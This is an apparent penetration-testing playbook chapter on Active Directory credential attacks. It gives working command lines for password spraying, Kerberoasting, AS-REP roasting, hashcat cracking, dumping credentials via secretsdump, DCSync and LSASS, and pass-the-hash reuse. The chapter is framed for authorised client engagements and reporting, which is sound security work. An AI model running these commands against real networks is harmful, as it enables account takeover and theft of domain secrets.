# 04 — Credential Attacks

**Goal:** obtain and validate usable credentials — spraying, Kerberos roasting + offline cracking,
dumping secrets, and reuse. Assumes at least a username list (`02`), often one low-priv account.

## Password spraying (check lockout policy FIRST: `nxc smb <DC_IP> -u <USER> -p <PASS> --pass-pol`)
```bash
nxc smb  <DC_IP> -u users.txt -p '<PASS>' --continue-on-success        # one password, many users
nxc ldap <DC_IP> -u users.txt -p '<PASS>' --continue-on-success
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<PASS>'     # Kerberos pre-auth spray
# common patterns: Season+Year! , Company123 , Welcome1 , <Month>2026!
```
Stop on first hit, re-validate, and don't keep spraying accounts you already own.

## AS-REP Roasting (accounts with pre-auth disabled — no creds needed)
```bash
impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile users.txt -format hashcat -outputfile loot/asrep.txt
nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' --asreproast loot/asrep.txt
Rubeus.exe asreproast /format:hashcat /outfile:loot\asrep.txt          # from Windows
# crack: hashcat -m 18200
```

## Kerberoasting (service accounts with SPNs)
```bash
impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>' -outputfile loot/kerb.txt
nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' --kerberoasting loot/kerb.txt
Rubeus.exe kerberoast /outfile:loot\kerb.txt                           # from Windows
Rubeus.exe kerberoast /rc4opsec /outfile:loot\kerb.txt                 # only crackable (RC4), quieter
Rubeus.exe kerberoast /user:<svc> /simple                              # single target
# crack: hashcat -m 13100
```
**Targeted Kerberoast:** if you have write over an account (see BloodHound `05`), set an SPN, roast, remove it:
```bash
targetedKerberoast.py -d <DOMAIN> -u '<USER>' -p '<PASS>' --dc-ip <DC_IP>
```

## Offline cracking (hashcat modes cheat-sheet)
```bash
hashcat -m 5600  loot/netntlmv2.txt rockyou.txt -r rules/best64.rule   # Responder NetNTLMv2
hashcat -m 18200 loot/asrep.txt     rockyou.txt -r rules/best64.rule   # AS-REP
hashcat -m 13100 loot/kerb.txt      rockyou.txt -r rules/best64.rule   # Kerberoast TGS
hashcat -m 1000  loot/nt.txt        rockyou.txt                         # raw NT (from secretsdump)
hashcat -m 3000  loot/lm.txt        rockyou.txt                         # LM
hashcat -m 5500  loot/netntlmv1.txt rockyou.txt                         # NetNTLMv1
# john equivalents
john --format=krb5tgs loot/kerb.txt --wordlist=rockyou.txt
john --format=krb5asrep loot/asrep.txt --wordlist=rockyou.txt
```

## Dump secrets (once local admin / on a DC)
```bash
impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>              # SAM + LSA secrets + cached
impacket-secretsdump -just-dc '<DOMAIN>/<USER>:<PASS>'@<DC_IP>        # NTDS via DRSUAPI (DCSync)
impacket-secretsdump -just-dc-user Administrator '<DOMAIN>/<USER>:<PASS>'@<DC_IP>
nxc smb <TARGET_IP> -u '<USER>' -p '<PASS>' --sam --lsa              # remote SAM/LSA
nxc smb <SUBNET>   -u '<USER>' -p '<PASS>' --ntds                    # NTDS where admin
# LSASS from a live host (pick OPSEC-appropriate)
lsassy -d <DOMAIN> -u '<USER>' -p '<PASS>' <TARGET_IP>
nxc smb <TARGET_IP> -u '<USER>' -p '<PASS>' -M nanodump
# from Windows foothold (mimikatz):  sekurlsa::logonpasswords  /  lsadump::sam
```

## Credential reuse (fastest AD privesc)
```bash
nxc smb <SUBNET> -u '<USER>' -H '<NTHASH>' --continue-on-success      # where is this hash local admin?
nxc smb <SUBNET> -u '<USER>' -p '<PASS>'  --continue-on-success       # where does this pw work?
# also try local-auth reuse of a dumped local admin hash across the fleet
nxc smb <SUBNET> -u 'Administrator' -H '<LOCAL_NTHASH>' --local-auth --continue-on-success
```

## Other credential sources
- **GPP passwords** in SYSVOL (`Groups.xml` cpassword) → `gpp-decrypt`.
- **Config files / scripts** on shares (connection strings, `web.config`, `.env`, `unattend.xml`).
- **KeePass / browser / Credential Manager / DPAPI** on hosts you own (`07`).
- **LAPS** local-admin passwords readable from AD (`09`).

## Evidence to capture
- Which account, where valid, what privilege it grants (screenshot `[+]`/`Pwn3d!`).
- For cracked creds: note the *weakness/pattern* for the finding, not just the plaintext.
- Root cause: weak policy, no MFA, RC4 SPNs, pre-auth disabled, cred reuse, GPP.

## Pitfalls
- **Lockouts** disrupt the client and other teams — track attempts per account, low and slow.
- Prefer `/rc4opsec` and small spray volumes; mass roasting/spraying is noisy.
- Re-validate every credential before building a path on it.
